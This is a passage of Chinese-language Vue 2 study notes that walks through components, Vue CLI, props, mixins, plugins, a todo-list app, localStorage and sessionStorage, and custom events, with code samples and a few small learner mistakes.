    <script type="text/javascript">
        Vue.config.productionTip = false;
        Vue.prototype.x=99
        const school = Vue.extend({
            template: `
            <div>
                <h3>学校名称：{{schoolName}}</h3>
                <h3>学校地址：{{address}}</h3>
                <button @click="showX">点我显示x</button>
            </div>
            `,
            data() {
                return {
                    schoolName: '尚硅谷',
                    address: '北京'
                }
            },
            methods: {
                showX(){
                    alert(this.x)//99
                }
            },
        })
        const vm=new Vue({
            el: '#root',
            data: {
                name: "anjingde",
            },
            components:{
                school
            }
        })
        console.log(school.prototype.__proto__  === Vue.prototype);//true
    </script>
</body>
</html>
```

![image-20230923225234854](D:\typora_photo\image-20230923225234854.png)

**注意：当定义好一个组件时，只有通过组件标签去调用的时候才会生成组件的实例vc，才可以进行后面的获得vue身上的属性值操作。**

### **3.4. 单文件组件**

##### 3.4.1基础

1.为.vue文件起名字：

```js
school.vue    
School.vue
my-school.vue
MySchool.vue
//其中第一个和第三个是为了迎合开发者工具显示方式的写法
```

2.ES6 模块化的暴露方式

- 默认暴露： export default 导出的成员名
- 统一暴露 ： export {导出的成员}
- 分别暴露：export const school=...........

3.ES6 模块化的引入方式

- 默认导入的语法： import 接收名称 from 模块路径
- 按需导入的语法： `import { 按需导入的名称 } from 模块路径
- 默认导出和整体导出一起使用

##### **3.4.2 一个.vue 文件的组成**

- template：组件结构 
- script：组件交互相关的代码（数据、方法等）
- style：组件的样式

School.vue

```vue
<template>
  <!-- 组件结构 -->
  <div class="demo">
    <h3>学校名称：{{ schoolName }}</h3>
    <h3>学校地址：{{ address }}</h3>
    <button @click="showInfo">点击</button>
  </div>
</template>
<script>
// 组件交互相关的代码（数据、方法等）
export default { //暴露组件
  name:'School',
  data() {
    return {
      schoolName: "拧梦",
      address: "北京",
    };
  },
  methods: {
    showInfo() {
      alert(this.schoolName);
    },
  }
};
// export default school;
</script>
<style>
/* 组件的样式 */
.demo {
  background-color: aqua;
}
</style>
```

Student.vue

```vue
<template>
    <!-- 组件结构 -->
    <div>
      <h3>学生姓名：{{ studentname }}</h3>
      <h3>学生年龄：{{ age }}</h3>
    </div>
  </template>
  <script>
  // 组件交互相关的代码（数据、方法等）
  export default { //暴露组件
    name:'Student',
    data() {
      return {
        studentname: "拧梦",
        age: 13,
      };
    }
  };
  // export default school;
  </script>
```

App.js

```vue
<template>
    <div>
        <School/> 
        <Student/>
    </div>
</template>
<script>
//引入组件
import School from './School.vue'
import Student from './Student.vue'
export default {
    name: 'App',
    components: {
        School,Student
    }
}
</script>
```

main.js

```js
import App from './App.vue'
new Vue({
    el: '#root',
    template:`<App></App>`,
    comments: {
        App
    }
})
```

index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>入口文件</title>
</head>
<body>
    <div id="root">
    </div>
    <script  type="text/javascript" src="../js/vue.js"></script>
    <script type="text/javascript"  src="./main.js"></script>
    <!-- 要在body前面引入时因为main.js涉及到root，所以得等页面加载完成只能调用 -->
</body>
</html>
```

## 四、**使用** **Vue** **脚手架**（CLI）

### 4.1 创建vue脚手架

#### **4.1.1** 说明

1. Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）。

2. 最新的版本是 4.x。

3. 文档: https://cli.vuejs.org/zh/。

#### **4.1.2** **具体步骤**

在确保安装了node.js的情况下安装：cmd(管理员)环境下运行，可以自行指定目录安装

第一步（仅第一次执行）：**全局安装@vue/cli**。

```
npm install -g @vue/cli
```

第二步：**切换到你要创建项目的目录**，然后使用命令创建项目

```
vue create xxxx
```

第三步：**启动项目**

```
npm run serve
```

备注：

1. 如出现下载缓慢请配置 npm 淘宝镜像：

```
npm config set registry https://registry.npm.taobao.org
```

2. Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置，请执行：

   ```
   vue inspect > output.js
   ```

![image-20230924100817874](D:\typora_photo\image-20230924100817874.png)

### 4.2 分析vue脚手架

#### 4.2.1 不同版本的vue

vue : 核心+模板解析器

在脚手架中，vue有很多不同版本（精简版),**在使用vue.runtime.xxx.js时，在创建vm实例时，里面的template配置项是不会被解析的，因为该版本缺少模板编辑器**。而对于.vue文件来说里面的template项是通过vue-template-compiler包来配置的。

关于不同版本的Vue:
1.vue.js与vue.runtime.xxx.js的区别:
     (1)   **vue.js是完整版的Vue包含:核心功能+模板解析器**。
     (2)   **vue.runtime.xxx.js**是运行版的Vue只包含:核心功能:**没有模板解析器**。
2.**因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用 render数接收到的createElement函数去指定具体内容。**

#### 4.2.2 render函数的使用

适用于没有模板编辑器的vue版本开发

![image-20230924110815847](D:\typora_photo\image-20230924110815847.png)

![image-20230924110825811](D:\typora_photo\image-20230924110825811.png)

#### 4.2.3 模板项目结构

```js
├── node_modules
  ├── public
  │ ├── favicon.ico: 页签图标
  │ └──index.html: 主页面
  ├── src
  │ ├── assets: 存放静态资源
  │ │ └── logo.png
  │ │──component: 存放组件
  │ │ └── HelloWorld.vue
  │ │──App.vue: 汇总所有组件
  │ │──main.js: 入口文件
  ├── .gitignore: git 版本管制忽略的配置
  ├── babel.config.js: babel 的配置文件
  ├── package.json: 应用包配置文件
  ├── README.md: 应用描述文件
  ├── package-lock.json：包版本控制文件
```

### 4.3 修改脚手架默认配置

暴漏配置：vue inspect > output.js

参考链接：https://cli.vuejs.org/zh/config/#pages

`vue.config.js 是一个可选的配置文件，如果项目的 (和 `package.json` 同级的) 根目录中存在这个文件，那么它会被 `@vue/cli-service 自动加载。

#### 4.3.1**选项 pages**

- Type: `Object`

- Default: `undefined`

  在 multi-page 模式下构建应用。**每个“page”应该有一个对应的 JavaScript 入口文件**。其值应该是一个对象，对象的 key 是入口的名字，value 是：

  - 一个指定了 `entry`, `template`, `filename`, `title` 和 `chunks` 的对象 (除了 `entry` 之外都是可选的)；
  - 或一个指定其 `entry` 的字符串。

```js
module.exports = {
  pages: {
    index: {
      // page 的入口
      entry: 'src/index/main.js',
      // 模板来源
      template: 'public/index.html',
      // 在 dist/index.html 的输出
      filename: 'index.html',
      // 当使用 title 选项时，
  // template 中的 title 标签需要是 <title><%= htmlWebpackPlugin.options.title %></title>
      title: 'Index Page',
      // 在这个页面中包含的块，默认情况下会包含
      // 提取出来的通用 chunk 和 vendor chunk。
      chunks: ['chunk-vendors', 'chunk-common', 'index']
    },
    // 当使用只有入口的字符串格式时，
    // 模板会被推导为 `public/subpage.html`
    // 并且如果找不到的话，就回退到 `public/index.html`。
    // 输出文件名会被推导为 `subpage.html`。
    subpage: 'src/subpage/main.js'
  }
}
```

#### 4.3.2 选项 lintOnSave

设置为 `true` 或 `'warning'` 时，`eslint-loader` 会将 lint 错误输出为编译警告。设置为false时，默认情况下，警告仅仅会被输出到命令行，且不会使得编译失败。

### 4.4 **Vue CLI 的ref props mixin plugin scoped**

#### 4.4.1 ref属性

1.**被用来给元素或子组件注册引用信息**(id的替代者)
2.**应用在html标签上获取的是真实DOM元素**，**应用在组件标签上是组件实例对象(vc)**
3.使用方式:
打标识:<h1ref="xxx">.....</h1> 或<School ref="xxx"></School>获取:**this.$refs.xxx**

```html
<template>
    <div>
        <h2 v-text="msg" ref="title"></h2>
        <button  ref="btn"  @click="show">点我输出上方的DOM 元素</button>
          <School  ref="sch"/>
    </div>
</template>
<script>
import School from './components/School.vue'
export default {
    name: 'App',
    components: {
        School
    },
    data() {
        return {
            msg:'欢迎学习VUE '
        }
    },
    methods: {
        show() {
            //this指向vc
            console.log(this.$refs);//{title: h2, btn: button, sch: VueComponent}
            //console.log(document.getElementById('title'));//<h2 id="title">欢迎学习VUE </h2>
            console.log(this.$refs.title);//<h2>欢迎学习VUE </h2> 真实DOM元素
            console.log(this.$refs.btn);//真实DOM元素
            console.log(this.$refs.sch);//school组件的实例对象vc
        }
    }

}
</script>
<style>
</style>
```

![image-20230924170417565](D:\typora_photo\image-20230924170417565.png)

![image-20230924171717573](D:\typora_photo\image-20230924171717573.png)

#### 4.4.2 props属性

功能:**让组件接收外部传过来的数据**
(1).传递数据:

```
<Demo name="xxx" sex="xxx" :age="xxx"/>
```

(2).接收数据:

```
第一种方式(只接收): 
         props:['name']
         
第二种方式(限制类型): props:{
                     name:Number
                  }
                  
第三种方式(限制类型、限制必要性、指定默认值): props:{ 
                                        name:{
                                        type:String，//类型
                                        required:true，//必要性 
                                        default:'老王//默认值
                                        }
                                       }
```

**备注:props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中,详情看myAge的值**，**但是对于藏在对象中的元素进行修改，有时候vue是监测不到的（vue对于props的监测是属于浅层次的，并非深度监测），但是不建议在props中修改属性值。**

**props的优先级高于data**

```vue
//Student.vue
<template>
   <div >
    <h2>{{ msg }}</h2>
    <h3>学生姓名：{{ name}} </h3>
    <h3>学生性别：{{ sex}} </h3>
    <h3>学生年龄：{{ myAge+1}}</h3>
    <button @click="updAge">点击年龄加一</button>
    <!-- <h3>学生年龄：{{ age*1+1 }}</h3> -->
  </div>
</template>

<script>
export default {
  name:'MyStudent',
  data() {
    return {
      msg: '欢迎你的到来',
      myAge:this.age
    }
  },
  methods: {
    updAge() {
      this.myAge++
    }
  },
  //简单声明接收
  props:['name','sex','age']
  //接收时对数据进行类型限制，可以在传入数据类型错误时报错
  // props: {
  //   name: String,
  //   age: Number,
  //   sex:String
  // }
  //接收时对数据进行类型限制+默认值指定+必要性限制
  // props: {
  //   name:{
  //     type: String,
  //     required: true,//name必要的
  //     default:99 //默认值
  //   },
  //   sex:{
  //     type: String,
  //     required: true,
  //   },
  //   age:{
  //     type: Number,
  //     default:99 //默认值
  //   }
  // }

}
</script>
```

```vue
//App.vue
<template>
    <div>
        <!-- 利用v-bind绑定age，保证传入的是一个数字而不是字符，有利于加减 -->
          <MyStudent name="李四" sex="男" :age="12"/><hr/>
          <!-- <MyStudent name="张三" sex="男" :age="16"/> -->
    </div>
</template>
<script>
import MyStudent from './components/MyStudent.vue'
export default {
    name: 'App',
    components: {
        MyStudent
    }

}
</script>
```

![image-20230924221128856](D:\typora_photo\image-20230924221128856.png)

#### 4.4.3 minix混入

功能：**可以把多个组件共用的配置提取成一个混入对象使用方式:**
第一步定义混合，例如:

```
{
  data(){....}, 
  methods:{...}
....
}
```

第二步使用混入。例如:
(1)全局混入:**Vue.mixin(xxx)**

(2)局部混入:**mixins:['xxx']**

```js
//mixin.js
export const hunhe = {
  methods: {
    showName() {
      alert(this.name)
    }
  },
  mounted() {
    console.log('你哈------');
  },
}
export const hunhe1 = {
  data() {
    return {
      s: 100,
      r: 200
    }
  }
}
```

```vue
//Schools.vue
<template>
  <div>
    <h3 @click="showName">学校名称：{{ name }}</h3>
    <h3>学校地址：{{ address }}</h3>
  </div>
</template>
  <script>
  import {hunhe,hunhe1} from '../mixin'
  export default {
      name: 'Schools',
      data() {
          return {
              name:'尚硅谷',
              address:'北京'
          }       
    },
    mixins:[hunhe,hunhe1]
  }
  </script>
```

当mixin文件中有关于生命钩子的函数，同时在自身也有定义相同函数，那么两个函数都会被调用：

![image-20230924225645411](D:\typora_photo\image-20230924225645411.png)

当自身定义了与mixin文件相同的data值以及方法时，会以自身定义为准（开发者工具查看的）

![image-20230924225852681](D:\typora_photo\image-20230924225852681.png)

#### 4.4.4 插件

功能：用于增强Vue
本质：包含install方法的一个对象，**install的第一个参数是Vue构造函数，第二个以后的参数是插件使用者传递的数据**。

**注意：因为install的第一个参数是Vue构造函数，所以可以调用Vue的各种属性和方法去定义需要的全局变量方法**

定义插件:

```
对象.install=function(Vue,options){
   //1.添加全局过滤器 
   Vue.filter(....)
   // 2.添加全局指令 
   Vue.directive(....)
   // 3.配置全局混入(合) (如果是定义data则会应用在所有vm和vc身上)
   Vue.mixin(....)
   // 4.添加实例方法
   Vue.prototype.$myMethod=function(){.….} Vue.prototype.$myProperty=xxxx

使用插件:Vue.use() 在main.js文件中引入并书写语句
```

```js
//plugin.js
export default {
    install(Vue, x, y, z) {
        console.log(x,y,z);
        console.log(Vue);//vue构造函数
        //定义全局过滤器
        Vue.filter('myslice', function (value) {
            return value.slice(0, 4);
        })
        //定义自定义的全局指令
        Vue.directive('fbinding',{
                //指令与元素成功绑定时
                bind(element, binding) {
                    element.value = binding.value ;
                },
                //指令所在的元素被插入页面时
                inserted(element, binding) {
                    element.focus();     //获得焦点，或者例如改变父元素某些属性
                },
                //指令所在的模板被重新解析时
                update(element, binding) {
                    element.value = binding.value;
                }
        })
        //定义混入
        Vue.mixin({
          data() {
            return {
                s: 1,
                y:2
            }
          }
        })
        //给Vue原型上添加方法(vm与vc都能用)
        Vue.prototype.demo = () => {
            alert('好的')
        }
    }
}
```

```js
//main,js
import Vue from 'vue'
import App from './App.vue'
//引入插件
import plugins from './plugin'
Vue.config.productionTip = false;
//使用插件
Vue.use(plugins,1,2,3)
new Vue({
    el: '#app',
    render: h => h(App)
})
```

```vue
//Studentss.vue
<template>
  <div>
    <h3>学生姓名：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
    <input type="text" v-fbinding:value="name">
  </div>
</template>

<script>
export default {
  name: "Studentss",
  data() {
    return {
      name: "张三",
      sex: "男"
    };
  }
};
</script>
```

```vue
//Schoolss.vue
<template>
  <div>
    <h3>学校名称：{{ name | myslice }}</h3>
    <h3>学校地址：{{ address }}</h3>
    <button @click="show">点击运行demo方法</button>
  </div>
</template>
  <script>
  export default {
      name: 'Schoolss',
      data() {
          return {
              name:'尚硅谷atguigu',
              address:'北京'
          }      
    },
    methods: {
            show(){
                this.demo()
              }
          }
  }
  </script>
```

![image-20230924232925102](D:\typora_photo\image-20230924232925102.png)

4.4.5 scoped属性
 作用：让样式在局部生效，防止冲突。 
 写法:

```css
<style lang="css" scoped>
    .demo{
      background-color: orange;
    }
 </style>
```

**注意：一般不在APP.vue中添加scoped,因为这样子在其子组件中无法统一应用该样式，如果写了只针对App.vue定义的内部样式生效。**

**如果不加scoped，会导致许多同名的样式被后引入的组件样式所覆盖**。

**style标签中的lang选项可以是css或者less(可嵌套的样式)，默认是css**

```vue
//Students
<template>
  <div class="demo">
    <h3 class="title">学生姓名：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
  </div>
</template>
<script>
export default {
  name: "Students",
  data() {
    return {
      name: "张三",
      sex: "男",
      s:666
    };
  },
  mounted() {
    console.log('你哈');
  }
};
</script>
<!-- scoped 作用域的意思 ,lang="css"表示是用css语法写的-->
<style lang="css" scoped>
    .demo{
      background-color: orange;
    }
  </style>
```

![image-20230924235646723](D:\typora_photo\image-20230924235646723.png)

### 4.5 TODO_LIST案例

vc组件实例对象，在书写写<schoo1/>或<schoo1></school>后vue进行解析时会生成，所以在定义组件的时候获得的是构造函数VueComponent，当在书写组件标签后，无论是在标签中添加属性或者方法，此时返回的this是vc。

总结：

1.组件化编码流程:
      (1) 拆分静态组件:组件要按照功能点拆分，命名不要与html元素冲突。
​      (2)实现动态组件:考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用:
          1).一个组件在用:放在组件自身即可。
           2).一些组件在用:放在他们共同的父组件上(状态提升)。
​     (3)实现交互:从绑定事件开始。
2.props适用于:
    (1).父组件==>子组件通信
   (2).子组件==>父组件通信(要求父先给子一个**函数**)
3.使用v-model时要切记:**v-model绑定的值不能是props传过来的值，因为props是不可以修改的!**
4.**props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做**。

```vue
//MyHedaer.vue
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="add"/>
  </div>
</template>
<script>
//nanoid 生成唯一标识的id,是一个函数
import { nanoid } from "nanoid";
export default {
  name: "Header",
  data() {
    return {
      title: "",
    };
  },
  props: ["addTodo"], //此时vc身上有该方法
  methods: {
    // add(event) {
    //   //将用户的输入包装为一个todo对象
    //   const todoObj = { id: nanoid(), title: event.target.value, done: false }
    //   this.addTodo(todoObj)
    //   event.target.value=""
    //   // console.log(event.target.value);//获取input框的数据
    //   // console.log(todoObj);
    // }
    add() {
      //校验数据
      if (!this.title.trim()) return alert("输入不能为空");
      //将用户的输入包装为一个todo对象
      const todoObj = { id: nanoid(), title: this.title, done: false };
      //通知APP组件添加一个todo对象
      this.addTodo(todoObj);
      //当input框按下回车后，清空输入
      this.title = '';
    },
  },
};
</script>
<style scoped>
/*header*/
.todo-header input {
  width: 560px;
  height: 28px;
  font-size: 14px;
  border: 1px solid #ccc;
  border-radius: 4px;
  padding: 4px 7px;
    }
.todo-header input:focus {
  outline: none;
  border-color: rgba(82, 168, 236, 0.8);
  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075),
    0 0 8px rgba(82, 168, 236, 0.6);
}
</style>
```

```vue
//MyList.vue
<template>
  <ul class="todo-main">
    <MyItem
      v-for="todoObj in todos" :key="todoObj.id" :todo="todoObj"
      :checkTodo="checkTodo"
      :deleteTodo="deleteTodo"
    />
  </ul>
</template>
<script>
import MyItem from "./MyItem.vue";
export default {
  name: "MyList",
  components: {
    MyItem
  },
 props:['todos','checkTodo','deleteTodo']
};
</script>
<style scoped>
/*main*/
.todo-main {
  margin-left: 0;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}
.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```

```vue
//MyItem.vue
<template>
  <li>
    <label>
<!--      这里勾选和取消勾选可以使用change和click作为事件处理-->
      <input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
      <!--v-model数据的双向绑定，checkbox使用v-model来双向绑定其是否被勾选,也可以实现效果但不推荐(因为其实修改了props中的数据)-->
      <!--这里修改了从List修改过来的props,这里的不允许改是浅层次，就是如果props是一个对象则这个修改这个对象的某一个属性vue是放行的-->
      <!-- <input type="checkbox" v-model="todo.done"/>-->
      <span>{{  todo.title }}</span>
    </label>
    <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
  </li>
</template>
<script>
export default {
    name: 'MyItem ',
  props: ['todo', 'checkTodo','deleteTodo'],
    methods: {
      handleCheck(id) {
        //通知APP组件将对应的todo对象的done值取反
        this.checkTodo(id)
      },
      handleDelete(id) {
        if (confirm('你确定删除吗？')) {
          this.deleteTodo(id)
        }
      }
    },
}
</script>
<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}
li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}
li button {
  float: right;
  display: none;
  margin-top: 3px;
}
li:before {
  content: initial;
}
li:last-child {
  border-bottom: none;
}
li:hover{
  background: #ddd;
}
li:hover button{
  display: block;
}
</style>
```

```vue
//MyFooter.vue
<template>
  <!--隐式类型转换-->
  <div class="todo-footer" v-show="total">
    <label>
      <!--这里也可用v-model来替代，此时不需要计算属性了-->
      <!-- <input type="checkbox" :checked="isAll" @change="checkAll"/> -->
      <input type="checkbox" v-model="isAll" />
    </label>
    <span>
      <span>已完成{{ doneTotal }}</span> / 全部{{ total }}
    </span>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  </div>
</template>
<script>
export default {
  name: "Footer",
  props: ["todos", 'checkAllTodo','clearAllTodo'],
  computed: {
    total() {
      return this.todos.length
    },
    doneTotal() {
      //方法三
      return this.todos.reduce(
        (pre, todo) => pre + (todo.done ? 1 : 0), 0);
      //方法一
      // let i = 0
      // this.todos.forEach((todo) => {
      //   if(todo.done) i++
      // });
      // return i
      //方法二
      // this.todos.reduce((pre, current) => {
      // //第一个参数是一个执行函数，其第一次的初始值是第二个参数的数字，最后一次返回值作为该reduce的最终返回值，current表示当前值，即是每一个todo对象
      // //第二个参数是初始值
      //   console.log('@', pre, current);
      //   return pre + (current.done?1:0)
      // }, 0)
    },
    // isAll() {
    //   return this.total===this.doneTotal && this.total>0
    // }
    isAll: {
      get() {
        return this.doneTotal === this.total && this.total > 0
      },
      set(value) {
        this.checkAllTodo(value)
      }
    }
  },
  methods: {
    // checkAll(e) {
    //   this.checkAllTodo(e.target.checked)
    // }
    clearAll() {
      this.clearAllTodo()
    }
  }
  };
</script>
<style scoped>
/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}
.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}
.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
    }
.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>
```

```vue
//App.vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader :addTodo="addTodo" />
        <MyList
          :todos="todos"
          :checkTodo="checkTodo"
          :deleteTodo="deleteTodo"
        />
        <MyFooter
          :todos="todos"
          :checkAllTodo="checkAllTodo"
          :clearAllTodo="clearAllTodo"
        />
      </div>
    </div>
  </div>
</template>
<script>
import MyHeader from "./components/MyHeader.vue";
import MyList from "./components/MyList.vue";
import MyFooter from "./components/MyFooter.vue";
export default {
  name: "App",
  components: {
    MyHeader,
    MyList,
    MyFooter,
  },
  data() {
    return {
      todos: [
        { id: "001", title: "吃饭", done: true },
        { id: "002", title: "睡觉", done: false },
        { id: "003", title: "玩耍", done: true },
      ],
    };
  },
  methods: {
    //添加一个todo
    addTodo(x) {
      //console.log('我收到了数据:',x);
      this.todos.unshift(x);
    },
    //勾选or取消一个todo
    checkTodo(id) {
      this.todos.forEach((todo) => {
        if (todo.id === id) todo.done = !todo.done;
      });
    },
    //删除一个todo
    deleteTodo(id) {
      // this.todos.forEach((todo) => {
      //   if(todo.id===id)  this.todos.shift(todo)
      // })
      this.todos = this.todos.filter((todo) => todo.id !== id);
    },
    //全选or取消全选
    checkAllTodo(done) {
      this.todos.forEach((todo) => {
        todo.done = done;
      });
    },
    //清除所有已经完成的todo
    clearAllTodo() {
      this.todos = this.todos.filter((todo) => {
        return !todo.done;
      });
    }
  },
};
</script>
<style>
/*base*/
body {
  background: #fff;
}
.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
    0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}
.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}
.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}
.btn:focus {
  outline: none;
}
.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>
```

```js
//main.js
//引入Vue
import Vue from "vue";
//引入App
import App from './App';
//关闭Vue的生产提示
Vue.config.productionTip = false;
// console.log(typeof App);//object
new Vue({
    el:'#app',
    render: h => h(App)
});
```

![image-20230925101244174](D:\typora_photo\image-20230925101244174.png)

![image-20230925210109740](D:\typora_photo\image-20230925210109740.png)

### 4.6 WebStorage

1.存储内容大小一般支持5MB左右(不同浏览器可能还不一样)
2.浏览器端通过Window.sessionStorage和Window.localStorage属性来实现本地存储机制。
3.相关API:

```
(1)xxxxxStorage.setItem("key', "value');
该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。
(2)xxxxxStorage.getItem('person');
该方法接受一个键名作为参数，返回键名对应的值。
(3)xxxxxStorage.removeItem(key');
该方法接受一个键名作为参数，并把该键名从存储中删除。
(4)xxxxxStorage.clear() 
该方法会清空存储中的所有数据。
```

4.备注:

- SessionStorage存储的内容会随着浏览器窗口关闭而消失。
- LocalStorage存储的内容，需要手动清除才会消失。
- **xxxxxStoragegetItem(xxx) 如果xxx对应的value获取不到，那么getltem的返回值是null**。
- **JSON.parse(nul1)的结果依然是null**

```html
//LocalStorage.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h2>LocalStorage</h2>
    <button onclick="saveData()">点我保存一个数据</button>
    <button onclick="readData()">点我获取一个数据</button>
    <button onclick="deleteData()">点我删除一个数据</button>
    <button onclick="deleteAllData()">点我删除所有数据</button>
<script type="text/javascript">
    let p={name:'张三',age:18}
function saveData(){
    localStorage.setItem('msg','hello');
    localStorage.setItem('msg1','hi');
    localStorage.setItem('person',JSON.parse(p));
}
function readData(){
    //获取没有的值是返回null
    console.log(localStorage.getItem('msg'));
    console.log(localStorage.getItem('msg1'));
    const result=localStorage.getItem('person');
    const result1=localStorage.getItem('person1');
    console.log(result);
    console.log(result1);//null
}
function deleteData(){
localStorage.removeItem('msg')
}
function deleteAllData(){
    localStorage.clear()
}
</script>
</body>
</html>
```

```html
//SessionStorage.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SessionStorage</title>
</head>
<body>
    <h2>SessionStorage</h2>
    <button onclick="saveData()">点我保存一个数据</button>
    <button onclick="readData()">点我获取一个数据</button>
    <button onclick="deleteData()">点我删除一个数据</button>
    <button onclick="deleteAllData()">点我删除所有数据</button>
    <script type="text/javascript">
        let p = { name: '张三', age: 18 }
        function saveData() {
            sessionStorage.setItem('msg', 'hello');
            sessionStorage.setItem('msg1', 'hi');
            sessionStorage.setItem('person', JSON.parse(p));
        }
        function readData() {
            //获取没有的值是返回null
            console.log(sessionStorage.getItem('msg'));
            console.log(sessionStorage.getItem('msg1'));
            const result = sessionStorage.getItem('person');
            const result1 = sessionStorage.getItem('person1');
            console.log(result);
            console.log(result1);//null
        }
        function deleteData() {
            sessionStorage.removeItem('msg')
        }
        function deleteAllData() {
            sessionStorage.clear()
        }
    </script>
</body>
</html>
```

![image-20230925220936057](D:\typora_photo\image-20230925220936057.png)

### 4.7 使用本地存储优化todolist案例

```vue
//App.vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader :addTodo="addTodo" />
        <MyList
          :todos="todos"
          :checkTodo="checkTodo"
          :deleteTodo="deleteTodo"
        />
        <MyFooter
          :todos="todos"
          :checkAllTodo="checkAllTodo"
          :clearAllTodo="clearAllTodo"
        />
      </div>
    </div>
  </div>
</template>
<script>
import MyHeader from "./components/MyHeader.vue";
import MyList from "./components/MyList.vue";
import MyFooter from "./components/MyFooter.vue";
export default {
  name: "App",
  components: {
    MyHeader,
    MyList,
    MyFooter,
  },
  data() {
    return {
      todos: JSON.parse(localStorage.getItem('todos'))||[]
    };
  },
  methods: {
    //添加一个todo
    addTodo(x) {
      //console.log('我收到了数据:',x);
      this.todos.unshift(x);
    },
    //勾选or取消一个todo
    checkTodo(id) {
      this.todos.forEach((todo) => {
        if (todo.id === id) todo.done = !todo.done;
      });
    },
    //删除一个todo
    deleteTodo(id) {
      // this.todos.forEach((todo) => {
      //   if(todo.id===id)  this.todos.shift(todo)
      // })
      this.todos = this.todos.filter((todo) => todo.id !== id);
    },
    //全选or取消全选
    checkAllTodo(done) {
      this.todos.forEach((todo) => {
        todo.done = done;
      });
    },
    //清除所有已经完成的todo
    clearAllTodo() {
      this.todos = this.todos.filter((todo) => {
        return !todo.done;
      });
    }
  },
  watch: {
    todos: {
      deep:true,//监视到todos中done值的变化
      handler(value) {
        localStorage.setItem('todos',JSON.stringify(value))
      }
     }
  }
};
</script>
<style>
/*base*/
body {
  background: #fff;
}
.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
    0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}
.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}
.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}
.btn:focus {
  outline: none;
}
.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>
```

### 4.8 组件的自定义事件

1.一种组件间通信的方式，适用于:**子组件=>父组件**
2.使用场景:A是父组件，B是子组件，B想给A传数据，那么就要**在A中给B绑定自定义事件(事件的回调在A中)**。
3.绑定自定义事件:
1.第一种方式，在父组件中

```html
<Demo @atguigu="test"/>或<Demo v-on:atguigum"test"/>
```

2.第二种方式，在父组件中:

```html
<Demo ref="demo"/>
mounted(){
this.$refs.xxx.$on("atguigu',this.test)
```

4.若想让自定义事件只能触发一次，可以使用**once修饰符，或$once方法**。 
4.**触发自定义事件:this.$emit('atguigu',数据)**
6.**解绑自定义事件**

```js
this.$off('atguigu')//适用于解绑一个自定义事件
this.$off(["atguigu", "demo"]); //解绑多个事件
this.$off()//解绑所有自定义事件
```

7.组件上也可以**绑定原生DOM事件，需要使用native修饰符**。eg:<Student @click.native="show"/>
8.注意:通过this.$refs.xxx.$on(atguigu,回调)绑定自定义事件时，**回调要么配置在methods中，要么用箭头函数**，否则this指向会出问题!

示例：使用箭头函数时，this指向的是app的组件实例对象（因为箭头函数没有this，所以往外层去找），若不采用箭头函数，则this指向的是student实例对象。

![image-20230926115250830](D:\typora_photo\image-20230926115250830.png)

```vue
//Students.vue
<template>
  <div class="demo">
    <h3>学生姓名：{{ name }}</h3>
    <h3>学生性别：{{ sex }}</h3>
    <h3>求和：{{ number }}</h3>
    <button @click="add">点我number+1</button><br/>
